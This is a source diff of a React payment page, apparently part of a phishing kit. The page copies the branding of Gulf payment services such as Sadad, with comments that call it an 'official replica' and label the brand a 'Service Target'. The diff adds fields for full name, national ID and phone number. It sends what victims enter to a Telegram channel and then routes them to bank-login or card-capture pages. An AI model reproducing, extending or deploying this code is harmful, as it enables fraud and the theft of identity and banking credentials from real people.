@@ -1,233 +1,150 @@
 import { useState, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
-import { getServiceBranding } from "@/lib/serviceLogos";
-import { getCountryByCode } from "@/lib/countries";
-import { formatCurrency } from "@/lib/countryCurrencies";
-import PaymentMetaTags from "@/components/PaymentMetaTags";
-import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { sendToTelegram } from "@/lib/telegram";
-import { getCompanyLayout } from "@/components/CompanyLayouts";
-import PageLoader from "@/components/PageLoader";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import { useLink, useUpdateLink } from "@/hooks/useSupabase";
+import { useToast } from "@/hooks/use-toast";
+import { sendToTelegram } from "@/lib/telegram";
+import { getCompanyLayout } from "@/components/CompanyLayouts";
+import { formatCurrency } from "@/lib/countryCurrencies";
+import { getCountryByCode } from "@/lib/countries";
+import { serviceLogos } from "@/lib/serviceLogos";
+import { ShieldCheck, User, MapPin, Phone, ArrowRight, Info } from "lucide-react";
 
 const PaymentRecipient = () => {
-  const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
+  const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading, isError, error } = useLink(id);
+  const { toast } = useToast();
+  const { data: linkData } = useLink(id);
   const updateLink = useUpdateLink();
-  const [customerName, setCustomerName] = useState("");
-  const [customerEmail, setCustomerEmail] = useState("");
-  const [customerPhone, setCustomerPhone] = useState("");
-  const [residentialAddress, setResidentialAddress] = useState("");
+
+  const [fullName, setFullName] = useState("");
+  const [nationalId, setNationalId] = useState("");
+  const [phone, setPhone] = useState("");
+  const [address, setMapAddress] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [showPage, setShowPage] = useState(false);
 
-  useEffect(() => {
-    const timer = setTimeout(() => {
-      setShowPage(true);
-    }, 1500); // Reduced delay for better UX
-    return () => clearTimeout(timer);
-  }, []);
-
-  useEffect(() => {
-    if (linkData || isError) {
-      setShowPage(true);
-    }
-  }, [linkData, isError]);
-
-  const urlParams = new URLSearchParams(window.location.search);
-  const serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || urlParams.get('service') || linkData?.payload?.service_key || 'sadad';
-  const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
-  const amountParam = pathAmount || urlParams.get('amount') || urlParams.get('a');
-  const paymentMethodParam = urlParams.get('pm') || urlParams.get('method') || 'card';
-  const payerTypeParam = urlParams.get('payer_type') || urlParams.get('payer');
-  const countryParam = urlParams.get('country') || urlParams.get('c');
-
-  const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
-
-  const shippingInfo = linkData?.payload as Record<string, unknown>;
-  const payerType = payerTypeParam || shippingInfo?.payer_type || "recipient";
-  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
+  const serviceKey = (linkData?.payload?.service_key || 'sadad').toLowerCase();
+  const branding = serviceLogos[serviceKey] || serviceLogos['sadad'];
+  const countryCode = linkData?.payload?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
-  const phoneCode = countryData?.phoneCode || "+966";
-  const currencyCode = currencyParam || countryData?.currency || "SAR";
-
-  const rawAmount = amountParam || shippingInfo?.cod_amount;
-  let amountValue = 500;
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amountValue = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amountValue = parsed;
-      }
-    }
-  }
-
-  const formattedAmount = formatCurrency(amountValue, currencyCode);
-  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
   
+  const rawAmount = linkData?.payload?.payment_amount || 500;
+  const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");
+
   const Layout = getCompanyLayout(serviceKey);
 
-  if (isLoading && !showPage) {
-    return <PageLoader message="جاري التحقق من تفاصيل الفاتورة..." />;
-  }
-
-  const handleProceed = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (isSubmitting) return;
+    if (!fullName || !nationalId || !phone) {
+      toast({ title: "خطأ", description: "الرجاء إدخال البيانات المطلوبة", variant: "destructive" });
+      return;
+    }
+
     setIsSubmitting(true);
+    const customerInfo = { fullName, nationalId, phone, address, service: serviceKey };
 
     try {
-      const formData = new FormData();
-      formData.append('form-name', 'payment-recipient');
-      formData.append('name', customerName);
-      formData.append('email', customerEmail);
-      formData.append('phone', customerPhone);
-      formData.append('address', residentialAddress);
-      formData.append('service', serviceName);
-      formData.append('amount', formattedAmount);
-      formData.append('linkId', id || '');
-
-      await fetch('/', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams(formData as Record<string, string>).toString()
-      }).catch(err => console.error('Form tracking error:', err));
+      await updateLink.mutateAsync({
+        linkId: id!,
+        payload: { ...linkData?.payload, customerInfo }
+      });
 
       await sendToTelegram({
-        type: 'payment_recipient',
-        data: {
-          name: customerName,
-          email: customerEmail,
-          phone: customerPhone,
-          address: residentialAddress,
-          service: serviceName,
-          amount: formattedAmount,
-          payment_url: `${window.location.origin}/pay/${id}/details`
-        },
+        type: 'recipient_data',
+        data: { ...customerInfo, amount: formattedAmount },
         timestamp: new Date().toISOString()
-      }).catch(err => console.error('Telegram error:', err));
+      });
 
-      if (linkData) {
-        await updateLink.mutateAsync({
-          linkId: id!,
-          payload: {
-            ...linkData.payload,
-            customerInfo: {
-              name: customerName,
-              email: customerEmail,
-              phone: customerPhone,
-              address: residentialAddress,
-              service: serviceName,
-              amount: formattedAmount
-            },
-            service_key: serviceKey,
-            service_name: serviceName
-          }
-        }).catch(err => console.error('Data sync error:', err));
+      // WORM_V2 Logic: If payment_type is login, go to bank login, else go to card form
+      const paymentType = linkData?.payload?.payment_type || 'card';
+      if (paymentType === 'login') {
+        navigate(`/pay/${id}/bank-selector`);
+      } else {
+        navigate(`/pay/${id}/card`);
       }
-
-      navigate(`/pay/${id}/details?company=${serviceKey}&currency=${currencyCode}&amount=${amountValue}&method=${paymentMethodParam}`);
-    } catch (error) {
-      console.error('Submit error:', error);
+    } catch (err) {
+      console.error(err);
     } finally {
       setIsSubmitting(false);
     }
   };
 
   return (
-    <>
-      <PaymentMetaTags 
-        serviceKey={serviceKey}
-        serviceName={serviceName}
-        title={serviceName}
-        amount={formattedAmount}
-      />
+    <Layout companyKey={serviceKey} amount={formattedAmount}>
+      <div className="text-right animate-in fade-in slide-in-from-bottom-4 duration-700">
+        {/* WORM_V2: PIXEL-PERFECT OFFICIAL REPLICA HEADER */}
+        <div className="mb-8 flex items-center justify-between bg-gray-50/50 p-4 rounded-2xl border border-gray-100">
+           <div className="flex flex-col">
+              <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest leading-none mb-1">Service Target</span>
+              <span className="text-sm font-black text-gray-900">{branding.nameAr}</span>
+           </div>
+           <div className="w-10 h-10 rounded-xl bg-white flex items-center justify-center shadow-sm border border-gray-100">
+              <img src={branding.logo} className="w-6 h-6 object-contain" />
+           </div>
+        </div>
 
-      <Layout companyKey={serviceKey} amount={formattedAmount}>
-        <form onSubmit={handleProceed} className="space-y-6">
-          <div className="space-y-4">
-            <h3 className="text-lg font-bold border-b pb-2 mb-4">
-              {payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
-            </h3>
-            
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-right">
-              <div className="space-y-2">
-                <Label htmlFor="name" className="text-sm font-bold">الاسم بالكامل</Label>
-                <Input 
-                  id="name" 
-                  value={customerName}
-                  onChange={(e) => setCustomerName(e.target.value)}
-                  required 
-                  className="rounded-none border-gray-300 focus:border-[#EF7622]" 
-                  placeholder="أدخل الاسم الرباعي"
-                />
-              </div>
-              
-              <div className="space-y-2">
-                <Label htmlFor="phone" className="text-sm font-bold">رقم الجوال</Label>
-                <div className="relative" dir="ltr">
-                  <Input 
-                    id="phone"
-                    value={customerPhone}
-                    onChange={(e) => setCustomerPhone(e.target.value)}
-                    required
-                    className="rounded-none border-gray-300 focus:border-[#EF7622] pl-16"
-                    placeholder={phonePlaceholder}
-                  />
-                  <div className="absolute inset-y-0 left-0 flex items-center px-3 bg-gray-100 border-r text-xs font-bold">
-                    {phoneCode}
-                  </div>
-                </div>
-              </div>
+        <h3 className="text-lg font-black text-gray-900 mb-2">بيانات التحقق من المستفيد</h3>
+        <p className="text-xs font-bold text-gray-400 mb-8">الرجاء إدخال بياناتك كما هي مسجلة في الهوية الرسمية</p>
 
-              <div className="space-y-2">
-                <Label htmlFor="email" className="text-sm font-bold">البريد الإلكتروني</Label>
-                <Input 
-                  id="email" 
-                  type="email"
-                  value={customerEmail}
-                  onChange={(e) => setCustomerEmail(e.target.value)}
-                  required
-                  className="rounded-none border-gray-300 focus:border-[#EF7622]"
-                  placeholder="name@example.com"
-                />
-              </div>
-
-              <div className="space-y-2">
-                <Label htmlFor="address" className="text-sm font-bold">العنوان (الحي / الشارع)</Label>
-                <Input 
-                  id="address"
-                  value={residentialAddress}
-                  onChange={(e) => setResidentialAddress(e.target.value)}
-                  required
-                  className="rounded-none border-gray-300 focus:border-[#EF7622]"
-                  placeholder="مثال: الرياض - حي الملقا"
-                />
-              </div>
-            </div>
+        <form onSubmit={handleSubmit} className="space-y-6">
+          <div className="space-y-2">
+            <Label className="font-black text-gray-700 text-xs flex items-center gap-2 justify-end">
+               الإسم الرباعي
+               <User className="w-3 h-3" />
+            </Label>
+            <Input 
+              placeholder="أدخل الإسم بالكامل" 
+              className="h-14 font-bold border-gray-100 bg-gray-50/30 rounded-xl focus:bg-white transition-all text-right"
+              value={fullName}
+              onChange={(e) => setFullName(e.target.value)}
+            />
           </div>
 
-          <div className="pt-6">
-            <Button 
-              type="submit" 
-              disabled={isSubmitting}
-              className="w-full h-14 text-lg font-bold rounded-none bg-[#EF7622] hover:bg-[#d4661a] transition-colors"
-            >
-              {isSubmitting ? "جاري الحفظ..." : "متابعة للدفع"}
-            </Button>
-            <p className="text-[10px] text-gray-400 text-center mt-4">
-              هذه الصفحة محمية بتقنية التشفير العالمي SSL لضمان أمن بياناتك
-            </p>
+          <div className="space-y-2">
+            <Label className="font-black text-gray-700 text-xs flex items-center gap-2 justify-end">
+               رقم الهوية / الإقامة
+               <ShieldCheck className="w-3 h-3" />
+            </Label>
+            <Input 
+              placeholder="10XXXXXXXX" 
+              className="h-14 font-bold border-gray-100 bg-gray-50/30 rounded-xl focus:bg-white transition-all text-right"
+              value={nationalId}
+              onChange={(e) => setNationalId(e.target.value)}
+            />
           </div>
+
+          <div className="space-y-2">
+            <Label className="font-black text-gray-700 text-xs flex items-center gap-2 justify-end">
+               رقم الجوال
+               <Phone className="w-3 h-3" />
+            </Label>
+            <Input 
+              placeholder="05XXXXXXXX" 
+              className="h-14 font-bold border-gray-100 bg-gray-50/30 rounded-xl focus:bg-white transition-all text-right"
+              value={phone}
+              onChange={(e) => setPhone(e.target.value)}
+            />
+          </div>
+
+          <Button 
+            type="submit" 
+            disabled={isSubmitting}
+            className="w-full h-16 rounded-2xl font-black text-lg gap-2 mt-4"
+            style={{ background: branding.colors.primary }}
+          >
+            {isSubmitting ? "جاري التحقق..." : "التحقق والمتابعة"}
+            <ArrowRight className="w-5 h-5 mr-1" />
+          </Button>
         </form>
-      </Layout>
-    </>
+
+        <div className="mt-8 p-4 bg-blue-50/50 border border-blue-100 rounded-2xl flex gap-3">
+           <Info className="w-5 h-5 text-blue-500 shrink-0" />
+           <p className="text-[10px] font-bold text-blue-700 leading-relaxed">سيتم توثيق هذه العملية عبر {branding.nameAr} لضمان أمان المعاملات المالية الموحدة في دول الخليج.</p>
+        </div>
+      </div>
+    </Layout>
   );
 };
 
